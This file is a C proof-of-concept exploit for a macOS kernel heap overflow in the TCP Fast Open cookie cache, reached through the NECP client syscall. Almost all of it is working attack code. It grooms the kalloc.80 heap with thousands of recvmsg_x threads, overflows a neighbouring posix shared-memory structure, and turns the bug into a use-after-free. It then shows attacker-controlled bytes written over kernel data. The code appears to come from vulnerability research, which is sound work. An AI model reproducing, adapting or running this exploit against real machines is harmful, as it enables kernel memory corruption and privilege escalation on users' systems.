//This POC causes a kernel heap overflow in tcp_cache_set_cookie_common (see bsd/netinet/tcp_cache.c).  A
//user-supplied length is passed to memcpy, which causes the destination struct tcp_cache allocation to be overflown.
//Unfortunately, the size of the source memory object is limited, so we cannot directly control the contents copied to the
//overflown area.  The source memory object is on the stack (tfo_cache_buffer in necp_client_update_cache).
//This POC uses this vulnerability to trigger a use-after-free condition on a pshminfo struct.
//
//The stack trace at the time of the overflow is:
//tcp_cache_set_cookie_common
//tcp_heuristics_tfo_update
//necp_client_update_cache
//necp_client_action (syscall)

#pragma clang diagnostic ignored "-Wdeprecated-declarations"

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <pthread.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/proc_info.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <unistd.h>
#include <uuid/uuid.h>

////////////////////////////////////////////////////////////////////////////////////////////////////
// Kernel defines missing from userland ////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////

#define      SO_NECP_ATTRIBUTES      0x1109  /* NECP socket attributes (domain, account, etc.) */

//Taken from bsd/net/necp.h
#define NECP_TLV_ATTRIBUTE_DOMAIN       7
#define NECP_TLV_ATTRIBUTE_ACCOUNT      8

#define NECP_OPEN_FLAG_OBSERVER      0x01 // Observers can query clients they don't own
#define NECP_OPEN_FLAG_BACKGROUND    0x02 // Mark this fd as backgrounded
#define NECP_OPEN_FLAG_PUSH_OBSERVER 0x04 // When used with the OBSERVER flag, allows updates to be pushed. Adding clients is not allowed in this mode.

#define NECP_CLIENT_ACTION_ADD              1 // Register a new client. Input: parameters in buffer; Output: client_id
#define NECP_CLIENT_ACTION_REMOVE           2 // Unregister a client. Input: client_id, optional struct ifnet_stats_per_flow
#define NECP_CLIENT_ACTION_COPY_PARAMETERS        3 // Copy client parameters. Input: client_id; Output: parameters in buffer
#define NECP_CLIENT_ACTION_COPY_RESULT          4 // Copy client result. Input: client_id; Output: result in buffer
#define NECP_CLIENT_ACTION_COPY_LIST          5 // Copy all client IDs. Output: struct necp_client_list in buffer
#define NECP_CLIENT_ACTION_REQUEST_NEXUS_INSTANCE   6 // Request a nexus instance from a nexus provider, optional struct necp_stats_bufreq
#define NECP_CLIENT_ACTION_AGENT            7 // Interact with agent. Input: client_id, agent parameters
#define NECP_CLIENT_ACTION_COPY_AGENT         8 // Copy agent content. Input: agent UUID; Output: struct netagent
#define NECP_CLIENT_ACTION_COPY_INTERFACE       9 // Copy interface details. Input: ifindex cast to UUID; Output: struct necp_interface_details
#define NECP_CLIENT_ACTION_SET_STATISTICS       10 // Deprecated
#define NECP_CLIENT_ACTION_COPY_ROUTE_STATISTICS    11 // Get route statistics. Input: client_id; Output: struct necp_stat_counts
#define NECP_CLIENT_ACTION_AGENT_USE          12 // Return the use count and increment the use count. Input/Output: struct necp_agent_use_parameters
#define NECP_CLIENT_ACTION_MAP_SYSCTLS          13 // Get the read-only sysctls memory location. Output: mach_vm_address_t
#define NECP_CLIENT_ACTION_UPDATE_CACHE         14 // Update heuristics and cache
#define NECP_CLIENT_ACTION_COPY_CLIENT_UPDATE     15 // Fetch an updated client for push-mode observer. Output: Client id, struct necp_client_observer_update in buffer
#define NECP_CLIENT_ACTION_COPY_UPDATED_RESULT      16 // Copy client result only if changed. Input: client_id; Output: result in buffer

#define NECP_CLIENT_CACHE_TYPE_ECN                 1       // Identifies use of necp_tcp_ecn_cache
#define NECP_CLIENT_CACHE_TYPE_TFO                 2       // Identifies use of necp_tcp_tfo_cache

#define NECP_CLIENT_CACHE_TYPE_ECN_VER_1           1       // Currently supported version for ECN
#define NECP_CLIENT_CACHE_TYPE_TFO_VER_1           1       // Currently supported version for TFO

#define NECP_MAX_CLIENT_PARAMETERS_SIZE         1024
#define NECP_TFO_COOKIE_LEN_MAX      16

typedef uint64_t           mach_vm_address_t;
typedef struct necp_cache_buffer {
  u_int8_t                necp_cache_buf_type;    //  NECP_CLIENT_CACHE_TYPE_*
  u_int8_t                necp_cache_buf_ver;     //  NECP_CLIENT_CACHE_TYPE_*_VER
  u_int32_t               necp_cache_buf_size;
  mach_vm_address_t       necp_cache_buf_addr;
} necp_cache_buffer;

typedef struct necp_tcp_tfo_cache {
  u_int8_t                necp_tcp_tfo_cookie[NECP_TFO_COOKIE_LEN_MAX];
  u_int8_t                necp_tcp_tfo_cookie_len;
  u_int8_t                necp_tcp_tfo_heuristics_success:1; // TFO succeeded with data in the SYN
  u_int8_t                necp_tcp_tfo_heuristics_loss:1; // TFO SYN-loss with data
  u_int8_t                necp_tcp_tfo_heuristics_middlebox:1; // TFO middlebox detected
  u_int8_t                necp_tcp_tfo_heuristics_success_req:1; // TFO succeeded with the TFO-option in the SYN
  u_int8_t                necp_tcp_tfo_heuristics_loss_req:1; // TFO SYN-loss with the TFO-option
  u_int8_t                necp_tcp_tfo_heuristics_rst_data:1; // Recevied RST upon SYN with data in the SYN
  u_int8_t                necp_tcp_tfo_heuristics_rst_req:1; // Received RST upon SYN with the TFO-option
} necp_tcp_tfo_cache;

//Taken from bsd/sys/socket.h
#define      SO_NECP_CLIENTUUID      0x1111  /* NECP Client uuid */

struct tlv
{
	uint8_t type;
	uint32_t length;
	unsigned char value[0];
} __attribute__((packed));

struct msghdr_x {
	void		*msg_name;	/* optional address */
	socklen_t	msg_namelen;	/* size of address */
	struct iovec 	*msg_iov;	/* scatter/gather array */
	int		msg_iovlen;	/* # elements in msg_iov */
	void		*msg_control;	/* ancillary data, see below */
	socklen_t	msg_controllen;	/* ancillary data buffer len */
	int		msg_flags;	/* flags on received message */
	size_t		msg_datalen;	/* byte length of buffer in msg_iov */
};

#define PSHMNAMLEN  31  /* maximum name segment length we bother with */

struct pshminfo {
	unsigned int  pshm_flags;          //0
	unsigned int  pshm_usecount;       //4
	off_t   pshm_length;               //8
	mode_t    pshm_mode;               //16
	uid_t   pshm_uid;                  //20
	gid_t   pshm_gid;                  //24
	char    pshm_name[PSHMNAMLEN + 1]; //28 /* segment name */
	struct pshmobj *pshm_memobjects;   //64
	struct label* pshm_label;          //72
};

//Taken from bsd/sys/proc_info.h
#define PROC_INFO_CALL_PIDFDINFO         0x3

////////////////////////////////////////////////////////////////////////////////////////////////////
// Globals and config options //////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////

#define MAX_FLAG_OVERFLOW_TRIES 50000
#define SHM_NAME "PWNPWN"
#define NUM_SHM_FDS 200
#define MAX_SOCKETS 10230
#define MAX_RECVMSGX_THREADS 2000

static int sockets[MAX_SOCKETS];
const char * sockets_ip = "127.0.0.1";
int socket_port_num = 3333;
int client_only = 0;

static int connected_sockets[3];
static int necp_fd;
static uuid_t necp_client_id; 

static pthread_t recvmsgx_threads[MAX_RECVMSGX_THREADS];
static char recvmsgx_buffer[1024];
static int recvmsgx_socket;
static int recvmsgx_done = 0;
static int recvmsgx_ran_once[MAX_RECVMSGX_THREADS];

////////////////////////////////////////////////////////////////////////////////////////////////////
// Helper functions ////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////

//necp_open syscall wrapper
int necp_open(int flags)
{
	return syscall(501, flags);
}

//necp_client_action syscall wrapper
int necp_client_action(int necp_fd, uint32_t action, uuid_t client_id, size_t client_id_len, uint8_t *buffer, size_t buffer_size)
{
	return syscall(502, necp_fd, action, client_id, client_id_len, buffer, buffer_size);
}

//proc_info syscall wrapper
int proc_info(int32_t callnum,int32_t pid,uint32_t flavor, uint64_t arg, void * buffer,int32_t buffersize)
{
	return syscall(336, callnum, pid, flavor, arg, buffer, buffersize);
}

//Gets a connected socket
void create_connected_socket(int * socks)
{
	int server_sock, client_sock;
	int bind_count = 0;
	int opt = 1;
	struct sockaddr_in addr;
	socklen_t addr_len;

	client_sock = socket(PF_INET, SOCK_STREAM, 0);
	if(client_sock < 0) {
		printf("Couldn't create client socket: errno %d: %s\n", errno, strerror(errno));
		exit(1);
	}

	if(client_only)
	{
		memset(&addr, 0, sizeof(addr));
		addr.sin_family = AF_INET;
		addr.sin_addr.s_addr = inet_addr(sockets_ip);
		addr.sin_port = htons(socket_port_num);
	}
	else
	{
		server_sock = socket(PF_INET, SOCK_STREAM, 0);
		if(server_sock < 0) {
			printf("Couldn't create server socket: errno %d: %s\n", errno, strerror(errno));
			exit(1);
		}

		//Bind the server to a port
		opt = 1;
		setsockopt(server_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

		while(1)
		{
			memset(&addr, 0, sizeof(addr));
			addr.sin_family = AF_INET;
			addr.sin_addr.s_addr = inet_addr(sockets_ip);
			addr.sin_port = htons(socket_port_num);
			socket_port_num++;

			if(bind(server_sock, (struct sockaddr *)&addr, sizeof(addr)) >= 0)
				break;
			bind_count++;
			if(bind_count == 10) {
				printf("Couldn't bind to the socket: errno %d: %s\n", errno, strerror(errno));
				exit(1);
			}
		}
		if(listen(server_sock, 5) < 0) {
			printf("Couldn't listen on the socket: errno %d: %s\n", errno, strerror(errno));
			exit(1);
		}
	}

	//Connect to the server from the client
	if(connect(client_sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
		printf("Couldn't connect the socket: errno %d: %s\n", errno, strerror(errno));
		exit(1);
	}

	if(!client_only)
	{
		addr_len = sizeof(addr);
		socks[2] = accept(server_sock, (struct sockaddr *)&addr, &addr_len);
		if(socks[2] < 0)
		{
			printf("Couldn't accept the socket: errno %d: %s\n", errno, strerror(errno));
			exit(1);
		}
		socks[1] = server_sock;
	}
	socks[0] = client_sock;
}

////////////////////////////////////////////////////////////////////////////////////////////////////
// Exploit helper functions ////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////

//Open a large number of sockets so that we can later set their necp attribute strings
static void prep_attribute_flood(int number)
{
	int i;

	if(number > MAX_SOCKETS)
	{
		printf("Can't ask for more than %d sockets (asked for %d)\n", MAX_SOCKETS, number);
		exit(1);
	}

	//Allocate all the sockets first
	memset(sockets, 0, sizeof(sockets));
	for(i = 0; i < number; i++)
	{
		sockets[i] = socket(PF_INET, SOCK_STREAM, 0);
		if(sockets[i] < 0) {
			printf("Couldn't create server socket: errno %d: %s\n", errno, strerror(errno));
			exit(1);
		}
	}
}

//Set a socket's necp attribute strings
static inline void set_attributes_with_content(int sock, int num_attributes, int length, char * content, char * content2)
{
	struct tlv * value, * current;
	char buffer[1024];
	size_t buffer_size;
	size_t value_size = length;

	if(num_attributes > 2 || num_attributes < 0)
	{
		printf("Bad num_attributes %d\n", num_attributes);
		exit(1);
	}

	buffer_size = 2 * (sizeof(struct tlv) + value_size);
	if(buffer_size > sizeof(buffer))
	{
		printf("Bad buffer size");
		exit(1);
	}
	current = (struct tlv *)buffer;
	current->type = NECP_TLV_ATTRIBUTE_DOMAIN;
	current->length = num_attributes > 0 ? value_size : 0;
	memcpy(current->value, content, current->length);
	current = (struct tlv *)(((char *)current) + (sizeof(struct tlv) + current->length));
	current->type = NECP_TLV_ATTRIBUTE_ACCOUNT;
	current->length = num_attributes > 1 ? value_size : 0;
	memcpy(current->value, content2, current->length);

	if(setsockopt(sock, SOL_SOCKET, SO_NECP_ATTRIBUTES, buffer, buffer_size) < 0)
	{
		printf("setsockopt failed: errno %d: %s\n", errno, strerror(errno));
		exit(1);
	}
}

//Close the sockets we opened for the necp attribute strings
static void close_sockets(int number)
{
	int i;

	if(number > MAX_SOCKETS)
	{
		printf("Can't ask for more than %d sockets (asked for %d)\n", MAX_SOCKETS, number);
		exit(1);
	}

	for(i = 0; i < number; i++)
	{
		if(sockets[i] != 0)
			close(sockets[i]);
	}
}

//Setup the connected socket that we'll use in the overflow.  Attach it to a new necp client fd.
static void tcp_cache_prep(void)
{
	int ret;
	uint8_t * buffer;
	size_t buffer_size;

	//Use necp_open to get a necp file descriptor
	necp_fd = necp_open(0);
	if(necp_fd < 0)
	{
		printf("Couldn't get a necp fd: errno %d: %s\n", errno, strerror(errno));
		exit(1);
	}

	//Setup a necp client and get the uuid
	memset(necp_client_id, 0, sizeof(uuid_t));
	buffer = malloc(0x10);
	memset(buffer, 0, 0x10);
	buffer_size = 0x10;

	ret = necp_client_action(necp_fd, NECP_CLIENT_ACTION_ADD, necp_client_id, sizeof(uuid_t), buffer, buffer_size);
	if(ret < 0) {
		printf("Couldn't add a necp client: errno %d: %s\n", errno, strerror(errno));
		exit(1);
	}

	//Create a socket and add a flow to the client
	create_connected_socket(connected_sockets);

	if(setsockopt(connected_sockets[0], SOL_SOCKET, SO_NECP_CLIENTUUID, necp_client_id, sizeof(uuid_t)) < 0) {
		printf("Couldn't assign the socket to the necp client: errno %d: %s\n", errno, strerror(errno));
		exit(1);
	}
}

//Close the file descriptors associated with the necp fd
static void tcp_cache_cleanup(void)
{
	close(connected_sockets[0]);
	if(!client_only) {
		close(connected_sockets[1]);
		close(connected_sockets[2]);
	}
	close(necp_fd);
}

//Update the cache info for the necp fd.  This will exercise the vulnerability if cookie_len > 16
static void set_necp_tcp_cache(int cookie_len)
{
	necp_cache_buffer ncb;
	necp_tcp_tfo_cache nttc;
	int ret;

	//Create a cache item
	memset(&nttc, 0, sizeof(necp_tcp_tfo_cache));
	nttc.necp_tcp_tfo_cookie_len = cookie_len;
	nttc.necp_tcp_tfo_heuristics_success=1;

	memset(&ncb, 0, sizeof(necp_cache_buffer));
	ncb.necp_cache_buf_type = NECP_CLIENT_CACHE_TYPE_TFO;
	ncb.necp_cache_buf_ver = NECP_CLIENT_CACHE_TYPE_TFO_VER_1;
	ncb.necp_cache_buf_size = sizeof(necp_tcp_tfo_cache);
	ncb.necp_cache_buf_addr = (mach_vm_address_t)&nttc;

	ret = necp_client_action(necp_fd, NECP_CLIENT_ACTION_UPDATE_CACHE, necp_client_id, sizeof(uuid_t), (uint8_t *)&ncb, sizeof(necp_cache_buffer));
	if(ret != 0)
	{
		printf("necp_client_action(UPDATE_CACHE): ret=%d (errno %d: %s)\n", ret, errno, strerror(errno));
		exit(1);
	}
}

//Cleanup any shm files that we've left alive
static void cleanup_shm()
{
	int i, j;
	char buffer[256];
	for(i = 0; i < NUM_SHM_FDS; i++)
	{
		snprintf(buffer, sizeof(buffer), SHM_NAME "_%d_%d", getpid(), i);
		for(j = 0; j < 100; j++)
			shm_unlink(buffer); //in case a previous run has created it
	}
}

//Open a shm file for the specific file number (opens the shm file with the name PWNPWN_$PID_$NUM)
static int create_shm_fd(int num, int errors_are_fatal)
{
	int shm_fd;
	char buffer[256];
	snprintf(buffer, sizeof(buffer), SHM_NAME "_%d_%d", getpid(), num);

	shm_fd = shm_open(buffer, O_RDWR|O_CREAT, 0666);
	if(shm_fd < 0 && errors_are_fatal)
	{
		printf("shm_open failed: shm_fd=%d (errno %d: %s)\n", shm_fd, errno, strerror(errno));
		exit(1);
	}
	return shm_fd;
}

//The recvmsgx worker function.  It just calls recvmsg_x on the blocking socket
void * recvmsgx_func(void * num)
{
  struct msghdr_x msgp[100];
  int i;

  memset(&msgp, 0, sizeof(msgp));
  for(i = 0; i < 100; i++)
  {
    msgp[i].msg_iov = malloc(sizeof(struct iovec));
    msgp[i].msg_iovlen = 1;
    msgp[i].msg_iov->iov_base = recvmsgx_buffer; 
    msgp[i].msg_iov->iov_len = sizeof(recvmsgx_buffer);
  }

  while(!recvmsgx_done)
  {
		recvmsgx_ran_once[(int)num] = 1;
    syscall(480, recvmsgx_socket, &msgp, 100, 0); //recvmsg_x
  }
  return NULL;
}

//Starts the recvmsgx flood that fills up the kalloc.80 zone
void start_recvmsgx_flood(int number)
{
  int i, flags, opt;
	long num;
	struct sockaddr_in addr;

	if(number > MAX_RECVMSGX_THREADS)
	{
		printf("Can't ask for more than %d threads (asked for %d)\n", MAX_RECVMSGX_THREADS, number);
		exit(1);
	}

	//Create the socket pair
	recvmsgx_socket = socket(PF_INET, SOCK_DGRAM, 0);
	if(recvmsgx_socket < 0) {
		printf("Couldn't create server socket: errno %d: %s\n", errno, strerror(errno));
		exit(1);
	}

	//Set reusable
	opt = 1;
	setsockopt(recvmsgx_socket, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

	//Bind the server to a port
  memset(&addr, 0, sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = inet_addr("127.0.0.1");
  addr.sin_port = htons(5555);
  if(bind(recvmsgx_socket, (struct sockaddr *)&addr, sizeof(addr)) < 0)
  {
    printf("Couldn't bind to the socket: errno %d: %s\n", errno, strerror(errno));
		exit(1);
  }

	//Make the socket blocking
  flags = fcntl(recvmsgx_socket, F_GETFL);
  flags = flags & (~O_NONBLOCK);
  fcntl(recvmsgx_socket, F_SETFL, flags);

	//Create the flooding threads
	recvmsgx_done = 0;
	memset(&recvmsgx_ran_once, 0, sizeof(recvmsgx_ran_once));
  for(i = 0; i < number; i++)
  {
		num = i;
    if(pthread_create(&recvmsgx_threads[i], NULL, recvmsgx_func, (void *)num))
    {
      printf("Couldn't create thread %d\n", i);
      exit(1);
    }
  }

	//Wait for all of the threads to call recvmsgx once (so a bunch of allocations are made)
	for(i = 0; i < number; i++)
	{
		while(!recvmsgx_ran_once[i])
		{
		}
	}	
}

//Stops the recvmsgx flood that fills up the kalloc.80 zone
void stop_recvmsgx_flood(int number)
{
  int i;

	if(number > MAX_RECVMSGX_THREADS)
	{
		printf("Can't ask for more than %d threads (asked for %d)\n", MAX_RECVMSGX_THREADS, number);
		exit(1);
	}

	recvmsgx_done = 1;
	close(recvmsgx_socket);
  for(i = 0; i < number; i++)
    pthread_join(recvmsgx_threads[i], NULL);
}

//Prints out information on a SHM entry using proc_info 
void print_shminfo(int shmfd, char * caption)
{
	struct pshm_fdinfo info;
	int ret, i;

	memset(&info, 0, sizeof(info));
	ret = proc_info(PROC_INFO_CALL_PIDFDINFO, getpid(), PROC_PIDFDPSHMINFO, shmfd, &info, sizeof(info));
	if(ret < 0)
	{
		printf("Couldn't get info with proc_info. ret %d errno %d (%s)\n", ret, errno, strerror(errno));
		exit(1);
	}

	printf("\n%s:\n", caption);
	printf("length=0x%llx\n", info.pshminfo.pshm_stat.vst_size);
	printf("gid=0x%x\n", info.pshminfo.pshm_stat.vst_gid);
	printf("mode=0x%hx\n", info.pshminfo.pshm_stat.vst_mode);
	printf("name=");
	for(i = 0; i < PSHMNAMLEN+1; i++)
		printf("%02X", info.pshminfo.pshm_name[i]);
	printf("\n");
}

////////////////////////////////////////////////////////////////////////////////////////////////////
// Main Execution //////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////

int main(int argc, char ** argv)
{
	struct rlimit rlp;
	int shm_fds[NUM_SHM_FDS];
	int overwritten_shm_fds[300];
	int found, ret, i, last_shm, test_fd, shminfo_fd;
	char shm_name_buffer[256];
	char buffer[200];
	struct timespec sleeptime = { .tv_sec = 0, .tv_nsec = 50 * 1000 * 1000 }; // 1/20 a second

	memset(shm_fds, 0, sizeof(shm_fds));
	if(argc > 1) {
		client_only = 1;
		sockets_ip = argv[1];
		if(argc > 2)
			socket_port_num = atoi(argv[2]);
	}
	printf("Running from process %d using ip %s:%d\n", getpid(), sockets_ip, socket_port_num);

	//Step 0: Update the file descriptor limit so we can flood our heap region
	rlp.rlim_cur = 10240;
	rlp.rlim_max = 10240;
	if(setrlimit(RLIMIT_NOFILE, &rlp))
	{
		printf("Couldn't raise number of file descriptors\n");
		exit(1);
	}

	//Step 1: Setup the necessary parts for the flood and overflow
	tcp_cache_prep();
	prep_attribute_flood(500);

	//Step 2: Flood the kalloc80 zone with allocations
	start_recvmsgx_flood(2000);

	//Step 3: Allocate posix shm structures (the victim) and a necp tcp cache structure (the overflow chunk)
	for(i =  0; i < NUM_SHM_FDS / 2; i++)
		shm_fds[i] = create_shm_fd(i, 1);
	set_necp_tcp_cache(16);
	for(i = NUM_SHM_FDS / 2; i < NUM_SHM_FDS; i++)
		shm_fds[i] = create_shm_fd(i, 1);

	//Step 4: Do the overflow.  We can't really control the contents afterwards, but all I need to do is get a lowish number put in the pshm_usercount (at offset 4 into the structure).
	set_necp_tcp_cache(29); //This will overflow the pshm_flags field and one byte of the pshm_usecount

	//Step 5: Figure out which shm file was overwritten.  We do this by checking which one errors out when unlink-ing
	printf("Detecting the overflown posix shm file\n");
	found = -1;
	for(i = 0; i < NUM_SHM_FDS; i++)
	{
		snprintf(shm_name_buffer, sizeof(shm_name_buffer), SHM_NAME "_%d_%d", getpid(), i);
		close(shm_fds[i]);
		ret = shm_unlink(shm_name_buffer);
		if(ret != 0)
		{
			if(found != -1)
			{
				printf("Multiple shm files failed on shm_unlink, couldn't detect overflown one.  This happens from time to time, try running again\n");
				exit(1);
			}

			printf("Found overwrote shm file %s file number %d (at index %d) (ret %d errno %d %s)\n", shm_name_buffer, shm_fds[i], i, ret, errno, strerror(errno));
			found = i;
		}
	}
	cleanup_shm();
	if(found == -1)
	{
		printf("Couldn't find overwrote shm file, try running again\n");
		exit(1);
	}
	
	//Step 6: open the overwritten shm fd a bunch more
	printf("Opening the posix shm file descriptors a bunch more\n");
	test_fd = create_shm_fd(found, 1);
	shminfo_fd = create_shm_fd(found, 1);
	for(i =  0; i < 252; i++)
		overwritten_shm_fds[i] = create_shm_fd(found, 1);

	//Step 7: Do the overflow again, until we get a valid flag.
	printf("Doing the overflow again until we get a valid flag\n");
	snprintf(shm_name_buffer, sizeof(shm_name_buffer), SHM_NAME "_%d_%d", getpid(), found);
	for(i = 0; 1; i++)
	{
		set_necp_tcp_cache(29); //This will overflow the pshm_flags field and one byte of the pshm_usecount

		//Check for valid flags
		if(shm_unlink(shm_name_buffer) == 0 && close(test_fd) == 0)
		{
			last_shm = create_shm_fd(found, 0);
			if(last_shm >= 0)
				break;
		}

		if(i == MAX_FLAG_OVERFLOW_TRIES)
		{
			printf("Couldn't set a valid pshm_flags value after %d tries, exiting\n", MAX_FLAG_OVERFLOW_TRIES);
			exit(1);
		}
		else if(i % 10000 == 0 && i != 0)
		{
			printf("Couldn't set a valid pshm_flags value after %d tries, try sleeping a bit?\n", i);
			nanosleep(&sleeptime, NULL);
		}
	}

	//Step 8: decrement the reference counter until it hits zero, and allocate a attribute string overtop of it
	//with the contents we would like to write to the shm entry
	print_shminfo(shminfo_fd, "Before overwrite");

	memset(buffer, 0x41, sizeof(buffer));
	for(i = 0; i < 252; i++)
	{
		close(overwritten_shm_fds[i]);
		shm_unlink(shm_name_buffer);
		set_attributes_with_content(sockets[i+1], 2, 79, buffer, buffer);
	}

	//At this point we've overlapped a pshminfo struct and a NECP attribute string in memory.
	//Thus when we print the shminfo, we'll see that all of the fields have been filled with 0x41
	print_shminfo(shminfo_fd, "After overwrite");

	return 0;
}

